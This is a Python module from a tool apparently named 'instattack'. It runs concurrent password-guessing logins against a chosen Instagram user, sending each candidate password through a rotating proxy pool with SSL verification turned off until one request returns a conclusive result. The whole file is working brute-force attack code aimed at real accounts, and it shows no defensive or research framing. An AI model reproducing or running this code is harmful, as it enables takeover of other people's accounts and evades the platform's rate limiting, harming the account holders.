import asyncio
import collections

from instattack.app import settings
from instattack.lib import logger
from instattack.lib.utils import limit_as_completed
from instattack.app.exceptions import PoolNoProxyError

from .models import InstagramResult, InstagramResultError
from .exceptions import (
    HTTP_RESPONSE_ERRORS, HTTP_REQUEST_ERRORS, find_request_error, find_response_error)


async def login(
    loop,
    session,
    user,
    token,
    password,
    proxy,
    proxy_pool=None,
    scheduler=None,
    log=None,
):
    """
    For a given password, makes a series of concurrent requests, each using
    a different proxy, until a result is found that authenticates or dis-
    authenticates the given password.

    [x] TODO
    --------
    Only remove proxy if the error has occured a certain number of times, we
    should allow proxies to occasionally throw a single error.

    [x] TODO
    --------
    We shouldn't really need this unless we are running over large numbers
    of requests... so hold onto code.  Large numbers of passwords might lead
    to this RuntimeError:

    RuntimeError: File descriptor 87 is used by transport
    <_SelectorSocketTransport fd=87 read=polling write=<idle, bufsize=0>>

    >>> except RuntimeError as e:
    >>>     if e.errno == 87:
    >>>         e = HttpFileDescriptorError(original=e)
    >>>         await self.communicate_request_error(e, proxy, scheduler)
    >>>     else:
    >>>         raise e
    """
    # TODO: Restrict Logging Based on Config
    log = logger.get_async(__name__, subname='login')

    proxy.update_time()
    result = None

    async def parse_response_result(result, password, proxy):
        """
        Raises an exception if the result that was in the response is either
        non-conclusive or has an error in it.

        If the result does not have an error and is non conslusive, than we
        can assume that the proxy was most likely good.
        """
        result = InstagramResult.from_dict(result, proxy=proxy, password=password)
        if result.has_error:
            raise InstagramResultError(result.error_message)
        else:
            if not result.conclusive:
                raise InstagramResultError("Inconslusive result.")
            return result

    async def raise_for_result(response):
        """
        Since a 400 response will have valid json that can indicate an authentication,
        via a `checkpoint_required` value, we cannot raise_for_status until after
        we try to first get the response json.
        """
        if response.status != 400:
            response.raise_for_status()
            json = await response.json()
            result = await parse_response_result(json, password, proxy)
            return result
        else:
            # Parse JSON First
            json = await response.json()
            try:
                return await parse_response_result(json, password, proxy)  # noqa
            except InstagramResultError as e:
                # Be Careful: If this doesn't raise a response the result will be None.
                response.raise_for_status()

    try:
        async with session.post(
            settings.INSTAGRAM_LOGIN_URL,
            headers=settings.HEADERS(token),
            data={
                settings.INSTAGRAM_USERNAME_FIELD: user.username,
                settings.INSTAGRAM_PASSWORD_FIELD: password
            },
            ssl=False,
            proxy=proxy.url  # Only Http Proxies Are Supported by AioHTTP
        ) as response:

            result = await raise_for_result(response)
            await proxy.handle_success(save=True)

            if proxy_pool:
                await proxy_pool.check_and_put(proxy)

            if scheduler:
                await scheduler.spawn(proxy.save())
            else:
                await proxy.save()

    except asyncio.CancelledError:
        await log.debug('Request Cancelled')
        pass

    except HTTP_RESPONSE_ERRORS as e:
        err = find_response_error(e)
        if not err:
            raise e

        await proxy.handle_error(err)

    except HTTP_REQUEST_ERRORS as e:
        err = find_request_error(e)
        if not err:
            raise e

        await proxy.handle_error(err)

    if proxy_pool:
        await proxy_pool.check_and_put(proxy)

    if scheduler:
        await scheduler.spawn(proxy.save())
    else:
        await proxy.save()
    return result


async def attempt(
    loop,
    session,
    user,
    token,
    password,
    proxy_pool=None,
    scheduler=None,
    batch_size=None,
):
    """
    Makes concurrent fetches for a single password and limits the number of
    current fetches to the batch_size.  Will return when it finds the first
    request that returns a valid result.
    """

    # TODO: Restrict Logging Based on Config
    log = logger.get_async(__name__, subname='attempt')
    proxies_count = collections.Counter()  # Indexed by Proxy Unique ID

    async def generate_login_attempts():
        """
        Generates coroutines for each password to be attempted and yields
        them in the generator.

        We don't have to worry about a stop event if the authenticated result
        is found since this will generate relatively quickly and the coroutines
        have not been run yet.
        """
        while True:
            proxy = await proxy_pool.get()
            if not proxy:
                raise PoolNoProxyError()

            if proxy.unique_id in proxies_count:
                log.warning(
                    f'Already Used Proxy {proxies_count[proxy.unique_id]} Times.',
                    extra={'proxy': proxy}
                )

            # We are going to want to use these to display information
            # later...
            proxies_count[proxy.unique_id] += 1
            yield login(
                loop,
                session,
                user,
                token,
                password,
                proxy,
                proxy_pool=proxy_pool,
                scheduler=scheduler,
            )

    # TODO:  We should figure out a way to allow proxies to repopulate and wait
    # on them for large number of password requests.  We don't want to bail when
    # there are no more proxies because we might be using them all currently

    # Wait for start event to signal that we are ready to start making
    # requests with the proxies.
    gen = generate_login_attempts()
    async for result, num_tries in limit_as_completed(gen, batch_size):
        if result is not None:
            await log.complete(
                f'Done Attempting Login with {password} '
                f'After {num_tries} Attempt(s)',
                extra={
                    'other': result
                })
            return result
